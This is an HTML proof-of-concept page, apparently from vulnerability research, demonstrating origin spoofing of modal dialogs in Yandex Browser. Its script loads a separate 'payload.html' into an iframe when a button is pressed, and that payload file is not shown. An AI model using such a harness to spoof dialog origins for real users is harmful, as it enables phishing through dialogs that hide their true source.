<!DOCTYPE html>
<html>
<head>
    <title>PoC Origin Removal - Francesco</title>
</head>
<body>
    <h2>Yandex Browser Origin Spoofing PoC</h2>
    <p>Target: Modal Dialog (Prompt/Alert/Confirm)</p>
    
    <button onclick="loadPayload()">Run Payload</button>

    <div id="container"></div>

    <script>
        function loadPayload() {
            const container = document.getElementById('container');
            const iframe = document.createElement('iframe');
            // Mengarah ke file kedua
            iframe.src = "payload.html"; 
            iframe.style.width = "400px";
            iframe.style.height = "200px";
            container.innerHTML = '';
            container.appendChild(iframe);
        }
    </script>
</body>
</html>
